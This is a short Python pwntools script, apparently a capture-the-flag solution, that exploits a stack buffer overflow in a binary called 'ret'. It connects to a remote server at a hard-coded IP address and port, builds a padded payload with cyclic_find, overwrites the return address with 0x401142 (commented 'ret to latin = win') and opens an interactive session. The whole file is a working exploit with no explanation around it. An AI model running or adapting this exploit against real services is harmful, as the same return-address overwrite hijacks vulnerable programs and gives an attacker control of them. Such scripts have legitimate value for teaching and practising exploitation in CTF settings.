from pwn import *

#r = process('./ret')
r = remote('208.68.39.19', 4448)
#debugeando
#gdb.attach(r)
#print r.recvline()
payload ="A" * cyclic_find('kaaalaa')
payload += p64(0x401142) #ret to latin = win
payload += "BBBBBBBB"#padding bad exit
payload += "CCCCCCCC"
r.sendline(payload)
r.interactive()
